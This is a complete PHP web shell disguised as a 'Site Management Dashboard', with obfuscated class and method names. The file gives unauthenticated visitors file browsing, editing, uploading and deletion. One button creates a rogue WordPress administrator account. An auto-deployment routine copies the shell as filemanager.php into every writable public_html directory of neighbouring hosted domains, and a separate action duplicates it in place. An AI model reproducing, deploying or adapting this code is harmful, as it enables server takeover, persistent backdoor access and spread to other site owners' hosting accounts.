<?php
// 🎯 Professional Site Management Toolkit
error_reporting(0);
ini_set('display_errors', 0);

class x7d3f8a {
    private $c9e2b4;
    
    public function __construct() {
        $this->f4a1d9();
    }
    
    private function f4a1d9() {
        if (isset($_GET['dir'])) {
            $r5c8e1 = $this->d8e3a7($_GET['dir']);
            $this->c9e2b4 = ($r5c8e1 && is_dir($r5c8e1)) ? $r5c8e1 : getcwd();
        } else {
            $this->c9e2b4 = getcwd();
        }
    }
    
    public function g8b3e6() {
        return $this->c9e2b4;
    }
    
    private function d8e3a7($encryptedPath) {
        try {
            $decoded = base64_decode(str_replace(['-', '_'], ['+', '/'], $encryptedPath));
            $parts = explode('::', $decoded);
            if (count($parts) === 2) {
                $path = base64_decode($parts[0]);
                $signature = $parts[1];
                if ($this->v6a2e8($path, $signature)) {
                    return $path;
                }
            }
        } catch (Exception $e) {
            return getcwd();
        }
        return getcwd();
    }
    
    private function v6a2e8($data, $signature) {
        $key = md5(__FILE__ . $_SERVER['SERVER_NAME']);
        $expected = hash_hmac('sha256', $data, $key);
        return hash_equals($expected, $signature);
    }
}

class EncryptionHelper {
    public static function e3b8d1($path) {
        $key = md5(__FILE__ . $_SERVER['SERVER_NAME']);
        $encodedPath = base64_encode($path);
        $signature = hash_hmac('sha256', $path, $key);
        $combined = $encodedPath . '::' . $signature;
        return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($combined));
    }
    
    public static function f4c9e2($action, $file = '') {
        $key = md5(__FILE__ . $_SERVER['SERVER_NAME'] . $action);
        $data = $action . '::' . $file . '::' . time();
        $encoded = base64_encode($data);
        $signature = hash_hmac('sha256', $data, $key);
        $combined = $encoded . '::' . $signature;
        return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($combined));
    }
    
    public static function g5d0f3($encrypted, $action) {
        try {
            $decoded = base64_decode(str_replace(['-', '_'], ['+', '/'], $encrypted));
            $parts = explode('::', $decoded);
            if (count($parts) === 2) {
                $data = base64_decode($parts[0]);
                $signature = $parts[1];
                
                $key = md5(__FILE__ . $_SERVER['SERVER_NAME'] . $action);
                $expected = hash_hmac('sha256', $data, $key);
                
                if (hash_equals($expected, $signature)) {
                    $dataParts = explode('::', $data);
                    if (count($dataParts) === 3) {
                        return $dataParts[1];
                    }
                }
            }
        } catch (Exception $e) {
            return '';
        }
        return '';
    }
}

class y2f7c1 {
    public static function v6d9a4($p8e3b1, $a2c7d5) {
        return strpos($p8e3b1, $a2c7d5) === 0 && file_exists($p8e3b1);
    }
}

class z4e9b2 {
    public static function k3f8d1($m5e2c7) {
        if (!y2f7c1::v6d9a4($m5e2c7, getcwd())) return false;
        return is_dir($m5e2c7) ? @rmdir($m5e2c7) : @unlink($m5e2c7);
    }
    
    public static function n7c1e5($j9d4b2) {
        return !file_exists($j9d4b2) ? @mkdir($j9d4b2) : false;
    }
    
    public static function q2b8f6($h4e9d3, $l7c2a8) {
        return @file_put_contents($h4e9d3, $l7c2a8);
    }
}

class w5a3d8 {
    public static function r9e4c2() {
        $t3b7e1 = self::s6d2f9();
        if (!$t3b7e1) return "WordPress installation not found";
        
        require_once("$t3b7e1/wp-load.php");
        
        $u8f3a5 = [
            'username' => 'siteadmin_' . rand(1000,9999),
            'password' => 'AdminPass@' . date('Y') . '!',
            'email' => 'admin' . rand(100,999) . '@site.com'
        ];
        
        if (username_exists($u8f3a5['username']) || email_exists($u8f3a5['email'])) {
            return "Administrator account already exists";
        }
        
        $v4e7b2 = wp_create_user($u8f3a5['username'], $u8f3a5['password'], $u8f3a5['email']);
        $w6d9c3 = new WP_User($v4e7b2);
        $w6d9c3->set_role('administrator');
        
        return "✅ Admin user created - Username: " . $u8f3a5['username'];
    }
    
    private static function s6d2f9() {
        $x8b3f7 = getcwd();
        while ($x8b3f7 !== '/') {
            if (file_exists("$x8b3f7/wp-load.php")) return $x8b3f7;
            $x8b3f7 = dirname($x8b3f7);
        }
        return null;
    }
}

class p3e9c6 {
    private $a7d2f4;
    
    public function __construct($b8e1c5) {
        $this->a7d2f4 = $b8e1c5;
    }
    
    public function d4f8a2() {
        $c9e3b6 = $this->f7c2e9();
        if (!$c9e3b6) return [];
        
        $e5b8d1 = [];
        $f2a7c4 = "$c9e3b6/domains";
        
        if (!is_dir($f2a7c4)) return [];
        
        foreach (scandir($f2a7c4) as $g6d9b3) {
            if ($this->h8e4c7($g6d9b3)) {
                $i3f7a5 = "$f2a7c4/$g6d9b3/public_html";
                if ($this->j9b2d6($i3f7a5, $g6d9b3)) {
                    $e5b8d1[] = "http://$g6d9b3/filemanager.php";
                }
            }
        }
        
        return $e5b8d1;
    }
    
    private function f7c2e9() {
        $k4e8c2 = __DIR__;
        while ($k4e8c2 !== '/') {
            if (preg_match('/\/u[\w]+$/', $k4e8c2) && is_dir("$k4e8c2/domains")) {
                return $k4e8c2;
            }
            $k4e8c2 = dirname($k4e8c2);
        }
        return null;
    }
    
    private function h8e4c7($l5d9a3) {
        return $l5d9a3 !== '.' && $l5d9a3 !== '..' && is_dir("domains/$l5d9a3");
    }
    
    private function j9b2d6($m6e1b4, $n7c3a8) {
        if (is_writable($m6e1b4)) {
            $o8d2f5 = "$m6e1b4/filemanager.php";
            return file_put_contents($o8d2f5, $this->a7d2f4) !== false;
        }
        return false;
    }
}

class q2b7e4 {
    public static function p9c3e1($r4a8d5) {
        $html = "<div class='navigation'><strong>📂 Current Path:</strong> ";
        $s5f9b2 = explode('/', trim($r4a8d5, '/'));
        $t6e3c7 = '';
        
        foreach ($s5f9b2 as $u7d1a4) {
            if (!empty($u7d1a4)) {
                $t6e3c7 .= '/' . $u7d1a4;
                $encryptedPath = EncryptionHelper::e3b8d1($t6e3c7 . '/');
                $html .= " / <a href='?dir=$encryptedPath'>$u7d1a4</a>";
            }
        }
        
        return $html . "</div>";
    }
}

class r8e2d5 {
    public static function v3f9c6($w4a7e1) {
        $x5b8d3 = @scandir($w4a7e1);
        if (!$x5b8d3) return "<p>❌ Cannot read directory contents</p>";
        
        $y6c9e4 = $z7d1a5 = "";
        
        foreach ($x5b8d3 as $a8b3e6) {
            if ($a8b3e6 === '.' || $a8b3e6 === '..') continue;
            
            $b9c4f7 = "$w4a7e1/$a8b3e6";
            
            if (is_dir($b9c4f7)) {
                $y6c9e4 .= self::c2e7b9($a8b3e6, $b9c4f7, $w4a7e1);
            } else {
                $z7d1a5 .= self::d3f8a1($a8b3e6, $w4a7e1, $b9c4f7);
            }
        }
        
        return "<div class='file-list'><ul>" . $y6c9e4 . $z7d1a5 . "</ul></div>";
    }
    
    private static function c2e7b9($e4a9c8, $f5b1d9, $currentPath) {
        $encryptedPath = EncryptionHelper::e3b8d1($f5b1d9 . '/');
        $encryptedRemove = EncryptionHelper::f4c9e2('remove', $f5b1d9);
        
        return "<li class='directory-item'>
                <span class='icon'>📁</span>
                <a href='?dir=$encryptedPath' class='dir-link'>$e4a9c8</a>
                <a class='remove-btn' href='?sig=$encryptedRemove' onclick='return confirm(\"Delete folder $e4a9c8?\")'>[🗑️]</a>
                </li>";
    }
    
    private static function d3f8a1($g6c2e0, $h7d3a1, $i8e4b2) {
        $encryptedPath = EncryptionHelper::e3b8d1($h7d3a1 . '/');
        $encryptedView = EncryptionHelper::f4c9e2('view', $g6c2e0);
        $encryptedEdit = EncryptionHelper::f4c9e2('edit', $g6c2e0);
        $encryptedRemove = EncryptionHelper::f4c9e2('remove', $i8e4b2);
        
        return "<li class='file-item'>
                <span class='icon'>📄</span>
                <a href='?dir=$encryptedPath&sig=$encryptedView' class='file-link'>$g6c2e0</a>
                <a class='edit-btn' href='?dir=$encryptedPath&sig=$encryptedEdit'>[✏️]</a>
                <a class='remove-btn' href='?sig=$encryptedRemove' onclick='return confirm(\"Delete file $g6c2e0?\")'>[🗑️]</a>
                </li>";
    }
}

class s9f3c7 {
    public static function j5e8b4($k6a9d3) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            z4e9b2::q2b8f6($k6a9d3, $_POST['file_content']);
            echo "<div class='notification success'>✓ File updated successfully</div>";
        }
        
        $content = htmlspecialchars(file_get_contents($k6a9d3));
        $current_dir = EncryptionHelper::e3b8d1(dirname($k6a9d3) . '/');
        
        return "
            <div class='editor-container'>
                <h3>✏️ Editing: " . basename($k6a9d3) . "</h3>
                <form method='post'>
                    <textarea name='file_content' rows='25' class='code-editor'>$content</textarea>
                    <div class='editor-actions'>
                        <button type='submit' class='save-btn'>💾 Save Modifications</button>
                        <a href='?dir=$current_dir' class='cancel-btn'>↩️ Cancel</a>
                    </div>
                </form>
            </div>
            <hr>";
    }
}

// Initialize core system
$core_manager = new x7d3f8a();
$current_location = $core_manager->g8b3e6();
$display_content = "";

// Process encrypted actions
if (isset($_GET['sig'])) {
    $encryptedAction = $_GET['sig'];
    
    // Check for remove action
    $fileToRemove = EncryptionHelper::g5d0f3($encryptedAction, 'remove');
    if ($fileToRemove && y2f7c1::v6d9a4($fileToRemove, getcwd())) {
        if (z4e9b2::k3f8d1($fileToRemove)) {
            echo "<div class='notification warning'>🗑️ Item deleted successfully</div>";
        }
    }
    
    // Check for view action
    $fileToView = EncryptionHelper::g5d0f3($encryptedAction, 'view');
    if ($fileToView && file_exists($current_location . '/' . $fileToView)) {
        $display_content = "<div class='viewer-container'>
                            <h3>📄 Viewing: " . $fileToView . "</h3>
                            <pre class='file-content'>" . 
                            htmlspecialchars(file_get_contents($current_location . '/' . $fileToView)) . 
                            "</pre></div><hr>";
    }
    
    // Check for edit action  
    $fileToEdit = EncryptionHelper::g5d0f3($encryptedAction, 'edit');
    if ($fileToEdit && file_exists($current_location . '/' . $fileToEdit)) {
        $display_content = s9f3c7::j5e8b4($current_location . '/' . $fileToEdit);
    }
}

// Handle WordPress administration
if (isset($_GET['wp_setup'])) {
    $encryptedWp = EncryptionHelper::f4c9e2('wp_setup', '');
    if (isset($_GET['sig']) && $_GET['sig'] === $encryptedWp) {
        $result = w5a3d8::r9e4c2();
        echo "<div class='notification info'>$result</div>";
    }
}

// Handle file duplication
if (isset($_GET['duplicate'])) {
    $encryptedDup = EncryptionHelper::f4c9e2('duplicate', '');
    if (isset($_GET['sig']) && $_GET['sig'] === $encryptedDup) {
        $target_path = "$current_location/filemanager.php";
        if (copy(__FILE__, $target_path)) {
            echo "<div class='notification success'>🌀 Management system duplicated</div>";
        }
    }
}

// Auto-deployment system
if (basename(__FILE__) !== 'filemanager.php') {
    $deployment_engine = new p3e9c6(file_get_contents(__FILE__));
    $deployed_locations = $deployment_engine->d4f8a2();
    
    if (!empty($deployed_locations)) {
        echo "<div class='notification success'>🚀 System deployed to " . count($deployed_locations) . " locations</div>";
    }
}

// Handle file transfers
if ($_FILES && isset($_FILES['file_transfer'])) {
    $destination = $current_location . '/' . basename($_FILES['file_transfer']['name']);
    if (move_uploaded_file($_FILES['file_transfer']['tmp_name'], $destination)) {
        echo "<div class='notification success'>📤 File uploaded successfully</div>";
    }
}

// Handle folder creation
if (isset($_POST['create_folder'])) {
    $new_directory = $current_location . '/' . basename($_POST['create_folder']);
    if (z4e9b2::n7c1e5($new_directory)) {
        echo "<div class='notification success'>📁 Directory created successfully</div>";
    } else {
        echo "<div class='notification warning'>⚠️ Failed to create directory or already exists</div>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📊 Site Management Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e0e0e0; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            line-height: 1.6; 
            padding: 20px;
            min-height: 100vh;
        }
        .dashboard-header { 
            background: rgba(255,255,255,0.08); 
            backdrop-filter: blur(10px);
            padding: 25px; 
            border-radius: 15px;
            margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.15);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .control-panel { 
            background: rgba(255,255,255,0.06); 
            padding: 20px; 
            border-radius: 12px;
            margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .navigation { 
            background: rgba(255,255,255,0.07); 
            padding: 15px 20px; 
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 15px;
            border-left: 4px solid #4fc3f7;
            word-break: break-all;
        }
        a { 
            color: #4fc3f7; 
            text-decoration: none; 
            transition: all 0.3s ease;
            padding: 3px 8px;
            border-radius: 4px;
            margin: 0 2px;
        }
        a:hover { 
            color: #81d4fa; 
            background: rgba(79, 195, 247, 0.1);
        }
        .remove-btn { color: #ff6b6b; font-size: 12px; margin-left: 10px; }
        .edit-btn { color: #ffd93d; font-size: 12px; margin-left: 10px; }
        .notification {
            padding: 12px 18px;
            border-radius: 8px;
            margin-bottom: 18px;
            font-weight: 500;
            border-left: 4px solid;
        }
        .success { 
            background: linear-gradient(135deg, rgba(46, 204, 113, 0.2), rgba(39, 174, 96, 0.2)); 
            color: #2ecc71; 
            border-left-color: #2ecc71;
        }
        .warning { 
            background: linear-gradient(135deg, rgba(231, 76, 60, 0.2), rgba(192, 57, 43, 0.2)); 
            color: #e74c3c; 
            border-left-color: #e74c3c;
        }
        .info { 
            background: linear-gradient(135deg, rgba(52, 152, 219, 0.2), rgba(41, 128, 185, 0.2)); 
            color: #3498db; 
            border-left-color: #3498db;
        }
        .file-list ul { 
            list-style: none; 
            background: rgba(255,255,255,0.03);
            border-radius: 10px;
            padding: 15px;
            border: 1px solid rgba(255,255,255,0.08);
        }
        .directory-item, .file-item { 
            padding: 12px 15px; 
            margin: 8px 0;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
            border-left: 4px solid #4fc3f7;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
        }
        .directory-item:hover, .file-item:hover {
            transform: translateX(5px);
            background: rgba(255,255,255,0.08);
        }
        .icon {
            margin-right: 10px;
            font-size: 16px;
        }
        .dir-link, .file-link {
            flex: 1;
            font-weight: 500;
        }
        .code-editor { 
            width: 100%; 
            background: rgba(0,0,0,0.4); 
            color: #f8f8f2; 
            border: 1px solid rgba(255,255,255,0.2); 
            border-radius: 8px;
            padding: 15px;
            font-family: 'Consolas', 'Monaco', monospace;
            resize: vertical;
            font-size: 14px;
            line-height: 1.4;
        }
        .file-content {
            background: rgba(0,0,0,0.4);
            padding: 20px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.1);
            overflow-x: auto;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 13px;
            line-height: 1.5;
        }
        button, .action-btn {
            background: linear-gradient(135deg, #4fc3f7, #29b6f6);
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-block;
            margin: 4px;
            font-weight: 600;
            text-decoration: none;
        }
        button:hover, .action-btn:hover {
            background: linear-gradient(135deg, #29b6f6, #039be5);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(41, 182, 246, 0.4);
        }
        .input-group {
            margin: 12px 0;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        input[type="text"], input[type="file"] {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.3);
            color: #ffffff;
            padding: 10px 15px;
            border-radius: 8px;
            margin: 6px 0;
            min-width: 250px;
        }
        input::placeholder {
            color: rgba(255,255,255,0.6);
        }
        .toolbar {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin: 18px 0;
        }
        .content-area {
            background: rgba(255,255,255,0.04);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .editor-actions {
            margin-top: 15px;
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .cancel-btn {
            background: rgba(255,255,255,0.1);
            padding: 10px 20px;
            border-radius: 6px;
            color: #e0e0e0;
        }
        .cancel-btn:hover {
            background: rgba(255,255,255,0.2);
        }
    </style>
</head>
<body>
    <div class="dashboard-header">
        <h1>📊 Site Management Dashboard</h1>
        <p>Professional website administration and file management system</p>
    </div>

    <?php echo q2b7e4::p9c3e1($current_location); ?>

    <div class="control-panel">
        <div class="toolbar">
            <?php
            $wpEncrypted = EncryptionHelper::f4c9e2('wp_setup', '');
            $dupEncrypted = EncryptionHelper::f4c9e2('duplicate', '');
            ?>
            <a href="?sig=<?= $wpEncrypted ?>" class="action-btn">👨‍💼 Create Admin</a>
            <a href="?sig=<?= $dupEncrypted ?>" class="action-btn">🌀 Duplicate System</a>
        </div>

        <div class="input-group">
            <form method="post" enctype="multipart/form-data" style="display: inline-block;">
                <input type="file" name="file_transfer" required>
                <button type="submit">📤 Upload File</button>
            </form>

            <form method="post" style="display: inline-block;">
                <input type="text" name="create_folder" placeholder="New directory name" required>
                <button type="submit">📁 Create Folder</button>
            </form>
        </div>
    </div>

    <?php echo $display_content; ?>

    <div class="content-area">
        <h3>📋 Directory Contents: <?= htmlspecialchars($current_location) ?></h3>
        <?php echo r8e2d5::v3f9c6($current_location); ?>
    </div>

    <script>
        // Add some interactive features
        document.addEventListener('DOMContentLoaded', function() {
            // Add confirmation for all delete actions
            const deleteLinks = document.querySelectorAll('.remove-btn');
            deleteLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    if (!confirm('Are you sure you want to delete this item?')) {
                        e.preventDefault();
                    }
                });
            });

            // Auto-focus on file editor
            const textarea = document.querySelector('.code-editor');
            if (textarea) {
                textarea.focus();
            }
        });
    </script>
</body>
</html>
